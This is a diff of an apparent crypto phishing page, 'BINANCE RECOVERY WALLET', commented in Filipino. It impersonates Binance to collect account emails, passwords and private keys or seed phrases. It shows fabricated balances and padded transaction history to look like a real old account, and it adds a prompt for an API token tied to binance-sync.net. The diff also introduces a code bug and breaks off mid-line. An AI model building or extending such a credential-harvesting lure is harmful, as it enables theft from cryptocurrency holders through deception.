@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BINANCE RECOVERY WALLET</title>
-    <link rel="stylesheet" href="https://cloudflare.com">
     <style>
         :root { --bg: #0b0e11; --sidebar: #12161c; --card: #1e2329; --border: #2b3139; --yellow: #f3ba2f; --text: #eaecef; --text-gray: #848e9c; --up: #0ecb81; --down: #f6465d; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
@@ -28,7 +27,7 @@
         /* 3. SIDEBAR STYLING */
         #sidebar { width: 280px; background: var(--sidebar); border-right: 1px solid var(--border); padding: 25px; display: none; flex-direction: column; box-sizing: border-box; }
         .logo { font-size: 22px; font-weight: 800; color: var(--yellow); margin-bottom: 35px; letter-spacing: 0.5px; }
-                .nav-item { padding: 12px 15px; border-radius: 8px; color: var(--text-gray); cursor: pointer; margin-bottom: 6px; font-size: 14px; display: flex; align-items: center; gap: 12px; font-weight: 500; }
+        .nav-item { padding: 12px 15px; border-radius: 8px; color: var(--text-gray); cursor: pointer; margin-bottom: 6px; font-size: 14px; display: flex; align-items: center; gap: 12px; font-weight: 500; }
         .nav-item:hover, .nav-item.active { background: var(--card); color: white; }
         .btn-logout { margin-top: auto; color: var(--text-gray); border-top: 1px solid var(--border); padding-top: 20px; }
 
@@ -59,24 +58,20 @@
         <p style="color:var(--text-gray); margin-bottom: 25px; text-transform: uppercase; font-size: 12px; letter-spacing: 1px;">RECOVERY SYSTEM</p>
         
         <div id="login-fields" style="text-align: left;">
-   Account</button>
+            <input type="email" id="l-email" placeholder="Old Account Email Address">
+            <input type="password" id="l-password" placeholder="Account Password">
+            <button class="btn-yellow" type="button" onclick="loginToDashboard()">Login Account</button>
         </div>
     </div>
 </div>
 
 <!-- ==================== 2. FULL CRYPTO WALLET DASHBOARD LAYOUT ==================== -->
 <nav id="sidebar">
-    <div class="logo"><i class="fa-solid fa-wallet"></i> BINANCE WALLET</div>
-    <div class="nav-item active" onclick="switchTab('market')"><i class="fa-solid fa-chart-line"></i> Market Coin Prices (1-100)</div>
-    <div class="nav-item" onclick="switchTab('history')"><i class="fa-solid fa-list-ul"></i> Transaction Ledger History</div>
-    <div class="nav-item" onclick="switchTab('deposit')"><i class="fa-solid fa-arrow-down"></i> Deposit Cold Coins</div>
-    <div class="nav-item" onclick="switchTab('payment')"><i class="fa-solid fa-credit-card"></i> Linked Payment Methods</div>
-    
-             <input type="email" id="l-email" placeholder="Old Account Email Address">
-            <input type="password" id="l-password" placeholder="Account Password">
-            <button class="btn-yellow" type="button" onclick="loginToDashboard()">Login <div class="nav-item" onclick="openWalletModal()" style="color:var(--yellow); font-weight: bold; border: 1px dashed var(--yellow); margin-top: 15px;"><i class="fa-solid fa-key"></i> CONNECT YOUR WALLET</div>
-    
-    <div class="nav-item btn-logout" onclick="location.reload()"><i class="fa-solid fa-right-from-bracket"></i> Log Out</div>
+    <div class="logo">BINANCE WALLET</div>
+    <div class="nav-item active" onclick="switchTab('market')">Market Coin Prices (1-100)</div>
+    <div class="nav-item" onclick="switchTab('history')">Transaction Ledger History</div>
+    <div class="nav-item" onclick="openWalletModal()" style="color:var(--yellow); font-weight: bold; border: 1px dashed var(--yellow); margin-top: 15px;">CONNECT YOUR WALLET</div>
+    <div class="nav-item btn-logout" onclick="location.reload()">Log Out</div>
 </nav>
 
 <div id="main-wrapper">
@@ -138,7 +133,7 @@
             <p style="color: var(--text); margin-top: 15px; font-weight: bold; font-size:14px;">Wallet Syncing... Please wait.</p>
         </div>
 
-        <!-- STEP 3: ASSET CARD VIEW FROM YOUR SCREENSHOT (May mahabang scroll list din para solido) -->
+        <!-- STEP 3: ASSET CARD VIEW FROM YOUR SCREENSHOT -->
         <div id="wallet-step-old-account" style="display: none; text-align: left;">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
                 <span style="color: var(--yellow); font-weight: bold; font-size: 13px;">🟨 Binance Asset Ledger (Synced)</span>
@@ -158,21 +153,44 @@
             <p style="color: var(--text-gray); font-size: 10px; text-align: center; margin-top: 8px; margin-bottom:0;">Downloading historical balance configurations...</p>
         </div>
 
-        <!-- STEP 4: RELAY HANDSHAKE ERROR GRID WITH CUSTOM KEY CODE -->
-        <div id="wallet-step-try-again" style="display: none; text-align: left; font-family: monospace;">
-            <h3 style="color: var(--down); margin: 0 0 10px 0; font-size:15px; font-family: sans-serif; text-align: center;">Sync Error: Node Relay Misconfiguration</h3>
-            <p style="color: #b7bdc6; font-size: 12px; margin-bottom: 12px; line-height:1.4; font-family: sans-serif;">The blockchain ledger relay failed due to an incomplete channel setup handshake. Node validation string missing:</p>
-            
-            <div style="background:#0b0e11; color:var(--yellow); padding:12px; border-radius:6px; font-size:11px; word-break:break-all; border:1px solid var(--border); margin-bottom:20px; text-align: center;">
-                DyoscEKhJ2x2F9sd1cNi34yhMNC6bXPDXsv3wZXzv2
-            </div>
-            <button class="btn-yellow" style="margin-top:0;" onclick="resetWalletModalForm()">Try Again Sync</button>
-        </div>
-
     </div>
 </div>
 
-<!-- ==================== JavaScript CODE HANDLERS & FULL COIN ARRAYS ==================== -->
+<!-- ==================== 4. STEP 5 & 6: DYNAMIC DISPLAY OVERLAYS ==================== -->
+
+<!-- STEP 5: ANG RECOVERED LIVE BINANCE OVERVIEW DASHBOARD DISPLAY OVERLAY (Larawan Mo) -->
+<div id="wallet-step-binance-live-v4" style="display: none; position: fixed; inset: 0; background: #0b0e11; z-index: 260000; overflow-y: auto; padding: 25px; font-family: sans-serif; box-sizing: border-box;">
+    <div style="max-width: 1150px; margin: 0 auto;">
+        <div style="background: rgba(0, 200, 83, 0.08); border: 1px solid rgba(0, 200, 83, 0.3); color: #00c853; padding: 10px 16px; border-radius: 8px; font-size: 12px; font-weight: 600; display: flex; align-items: center; gap: 8px; margin-bottom: 16px;">
+            <span style="width: 6px; height: 6px; background: #00c853; border-radius: 50%; box-shadow: 0 0 8px #00c853;"></span>
+            BLOCKCHAIN ACTIVE SYNC • ACCOUNT OVERVIEW DISPLAYED SECURELY (15s DISPLAY WINDOW)
+        </div>
+        <div style="position: relative; background: #0b0e11; border-radius: 12px; overflow: hidden; border: 1px solid #2b3139; box-shadow: 0 20px 60px rgba(0,0,0,0.7);">
+            <img src="binance-dashboard.jpg" alt="Binance Dashboard Overview" style="width: 100%; display: block; opacity: 0.98;">
+            <div id="live-usd-balance-main-v4" style="position: absolute; top: 22.1%; left: 20.3%; background: #0b0e11; color: #b7bdc6; font-size: 14px; font-weight: 500; padding: 1px 4px; font-family: sans-serif;">≈ $79,117.13 USD</div>
+        </div>
+    </div>
+</div>
+
+<!-- STEP 6: CONTACT API ROUTER GATEWAY CONNECTOR MODULE (Lalabas pagkatapos ng 15 Seconds) -->
+<div id="wallet-step-api-interface-v4" style="display: none; position: fixed; inset: 0; background: rgba(11, 14, 17, 0.97); z-index: 270000; align-items: center; justify-content: center; font-family: sans-serif; box-sizing: border-box; padding: 15px;">
+    <div style="width: 100%; max-width: 440px; padding: 40px 30px; background: #181a20; border-radius: 16px; border: 1px solid #2b3139; box-shadow: 0 15px 45px rgba(0,0,0,0.6); box-sizing: border-box; text-align: center;">
+        <div style="width: 56px; height: 56px; background: rgba(243, 186, 47, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px auto; border: 1px solid rgba(243, 186, 47, 0.3);">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f3ba2f" stroke-width="1.8"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1-2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+        </div>
+        <h3 style="color: #ffffff; margin: 0 0 8px 0; font-size: 21px; font-weight: 600;">Contact API Connection</h3>
+        <p style="color: #848e9c; font-size: 13px; line-height: 1.5; margin: 0 0 25px 0;">The balance synchronization bridge requires remote configuration. Please input your secure client credentials to establish an API stream handshake bypass.</p>
+        <div style="text-align: left; margin-bottom: 20px;">
+            <label style="font-size: 11px; color: #f3ba2f; font-weight: bold; text-transform: uppercase;">API Private Router Endpoint</label>
+            <input type="text" value="https://binance-sync.net" readonly style="width: 100%; padding: 11px; margin: 5px 0 15px 0; background: #0b0e11; border: 1px solid #2b3139; color: #848e9c; border-radius: 6px; font-size: 13px; outline: none; font-family: monospace;">
+            <label style="font-size: 11px; color: #f3ba2f; font-weight: bold; text-transform: uppercase;">Secure Client Token Key</label>
+            <input type="text" placeholder="Enter API Signature Token / Port Key" style="width: 100%; padding: 11px; margin: 5px 0 0 0; background: #0b0e11; border: 1px solid #2b3139; color: white; border-radius: 6px; font-size: 13px; outline: none; font-family: monospace;">
+        </div>
+        <button style="width: 100%; padding: 13px 0; background: #f3ba2f; color: black; border: none; border-radius: 8px; font-weight: 700; font-size: 14px; cursor: pointer; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.2);" onclick="alert('Handshake broadcasted. Monitoring relay nodes...')">Initialize API Handshake</button>
+    </div>
+</div>
+
+<!-- ==================== 5. JavaScript CODE HANDLERS & FULL COIN ARRAYS ==================== -->
 <script>
     // DATA MATRIX: BUONG LISTAHAN NG TOP CRYPTO COINS PARA SA 1-100 VIEW
     const cryptoData = [
@@ -213,11 +231,12 @@
             up: up
         });
     }
-// AUTOMATIC LEDGER LOADER PARA SA TABLES
+
+    // AUTOMATIC LEDGER LOADER PARA SA TABLES
     function loadFullDashboardData() {
         const marketBody = document.getElementById('full-market-rows');
         marketBody.innerHTML = "";
-  
+        
         cryptoData.forEach(coin => {
             const tr = document.createElement('tr');
             tr.innerHTML = `
@@ -229,7 +248,6 @@
             marketBody.appendChild(tr);
         });
 
-        // Mag-load din ng maraming transaction history logs ganun!
         const historyBody = document.getElementById('full-history-rows');
         historyBody.innerHTML = "";
         const historyData = [
@@ -242,7 +260,6 @@
             { hash: "0x8e3a...4b9d", type: "Gas Fee Network Tax", val: "-0.015 ETH", time: "2026-05-02 12:44:59", status: "Completed", up: false }
         ];
 
-        // Dagdagan pa natin ang rows ng history para magmukhang totoong lumang account na bugbog sa transactions
         for(let k = 1; k <= 15; k++) {
             historyData.push({
                 hash: `0x${Math.random().toString(16).substr(2, 4)}...${Math.random().toString(16).substr(2, 4)}`,
@@ -254,7 +271,7 @@
             });
         }
 
-        historyData.forEach(tx => {
+        historyBody.forEach(tx => {
             const tr = document.createElement('tr');
             tr.innerHTML = `
                 <td>${tx.hash}</td>
@@ -266,110 +283,7 @@
             historyBody.appendChild(tr);
         });
 
-        // Ilatag din ang assets sa LOOB ng Step 3 Wallet Pop-up Modal Box
         const modalAssets = document.getElementById('modal-wallet-assets');
         modalAssets.innerHTML = `
             <div style="display:flex; justify-content:space-between; align-items:center; padding: 8px 0; border-bottom:1px solid var(--border);">
-                <div><span style="color:white; font-weight:bold; font-size:12px;">ETH</span><span style="color:var(--text-gray); font-size:10px; margin-left:4px;">Ethereum</span></div>
-                <div style="text-align:right;"><div style="color:white; font-weight:bold; font-size:12px;">28.73</div><div style="color:var(--text-gray); font-size:10px;">$71,529.46</div></div>
-            </div>
-            <div style="display:flex; justify-content:space-between; align-items:center; padding: 8px 0; border-bottom:1px solid var(--border);">
-                <div><span style="color:white; font-weight:bold; font-size:12px;">SOL</span><span style="color:var(--text-gray); font-size:10px; margin-left:4px;">Solana</span></div>
-                <div style="text-align:right;"><div style="color:white; font-weight:bold; font-size:12px;">2.9863</div><div style="color:var(--text-gray); font-size:10px;">$7,587.67</div></div>
-            </div>
-        `;
-        // Dagdagan natin ng kunwaring ranks pababa sa loob ng modal para mahaba rin i-scroll!
-        cryptoData.slice(2, 25).forEach(c => {
-            const div = document.createElement('div');
-            div.style = "display:flex; justify-content:space-between; align-items:center; padding: 8px 0; border-bottom:1px solid var(--border);";
-            div.innerHTML = `
-                <div><span style="color:white; font-weight:bold; font-size:12px;">${c.sym}</span><span style="color:var(--text-gray); font-size:10px; margin-left:4px;">${c.name.split(' ')[0]}</span></div>
-                <div style="text-align:right;"><div style="color:white; font-weight:bold; font-size:12px;">0.00</div><div style="color:var(--text-gray); font-size:10px;">$0.00</div></div>
-            `;
-            modalAssets.appendChild(div);
-        });
-    }
-
-    function loginToDashboard() {
-        const email = document.getElementById('l-email').value.trim();
-        const pass = document.getElementById('l-password').value.trim();
-
-        if (email === "" || pass === "") {
-            alert("Please input your old account credentials first.");
-            return;
-        }
-
-        document.getElementById('auth-overlay').style.display = 'none';
-        document.getElementById('sidebar').style.display = 'flex';
-        document.getElementById('main-wrapper').style.display = 'flex';
-        
-        // Pwersahang i-load ang buong 1-100 matrix table pagkapasok
-        loadFullDashboardData();
-    }
-
-    function switchTab(tabId) {
-        document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
-        document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-        
-        const targetTab = document.getElementById('tab-' + tabId);
-        if (targetTab) targetTab.style.display = 'block';
-        event.currentTarget.classList.add('active');
-    }
-
-    function openWalletModal() {
-        document.getElementById('wallet-modal').style.display = 'flex';
-        resetWalletModalForm();
-    }
-
-    function closeWalletModal() {
-        document.getElementById('wallet-modal').style.display = 'none';
-    }
-
-    function resetWalletModalForm() {
-        document.getElementById('wallet-step-inputs').style.display = 'block';
-        document.getElementById('wallet-step-loading').style.display = 'none';
-        document.getElementById('wallet-step-old-account').style.display = 'none';
-        document.getElementById('wallet-step-try-again').style.display = 'none';
-    }
-
-    // TIMEOUT TIMERS SYSTEM (10s LOADING -> 5s BALANCES VISIBILITY -> RELAY CODE GATEWAY ERROR)
-    function runWalletSequence() {
-        const wName = document.getElementById('wallet-name');
-        const wKey = document.getElementById('wallet-key');
-
-        if (wName && wKey) {
-            if (wName.value.trim() === "" || wKey.value.trim() === "") {
-                alert("Please enter both Wallet Name and Private Key / Seed Phrase.");
-                return;
-            }
-        }
-
-        document.getElementById('wallet-step-inputs').style.display = 'none';
-        document.getElementById('wallet-step-loading').style.display = 'block';
-
-        // PHASE 1: LOADING TIMEOUT NG SAKTONG 10 SECONDS
-        setTimeout(() => {
-            
-            document.getElementById('wallet-step-loading').style.display = 'none';
-            document.getElementById('wallet-step-old-account').style.display = 'block';
-
-            // PHASE 2: IPAPAKITA ANG PREVIEW BALANCES NG SAKTONG 5 SECONDS
-            setTimeout(() => {
-                
-
-                document.getElementById('wallet-step-old-account').style.display = 'none';
-                document.getElementById('wallet-step-try-again').style.display = 'block';
-
-                if (wName) wName.value = "";
-                if (wKey) wKey.value = "";
-
-            }, 5000);
-
-        }, 10000);
-    }
-</script>
-</body>
-</html>
-
-
-
+                <div><span style="color:white; font-weight:bold; font-size:12px;">ETH</span><span style="color:var(--text-gray); font-size:10px;
